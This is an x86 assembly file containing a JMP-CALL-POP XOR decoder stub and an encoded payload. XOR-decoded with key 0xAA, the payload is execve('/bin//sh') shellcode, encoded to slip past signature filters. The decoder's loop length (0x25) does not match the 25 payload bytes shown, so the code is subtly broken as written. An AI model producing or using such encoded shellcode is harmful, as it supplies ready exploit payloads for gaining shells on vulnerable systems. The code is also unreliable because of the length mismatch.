global _start

section .text

_start:

    jmp short setshellc

decoder:
    pop esi ; pop address of our shellcode to esi
    xor ecx, ecx ; xor out ecx register
    mov cl, 0x25 ; set cl register to length of shellcode

decode:
    xor byte [esi], 0xAA ; xor the byte with 0xAA
    inc esi  ; next byte
    loop decode ; next iteration
    
    jmp short shellcode ; if xoring is done (ecx eq 0), jump to shellcode
 

setshellc:
    call decoder
    shellcode: db 0x9b,0x6a,0xfa,0xc2,0xc4,0x85,0xd9,0xc2,0xc2,0x85,0x85,0xc8,0xc3,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a

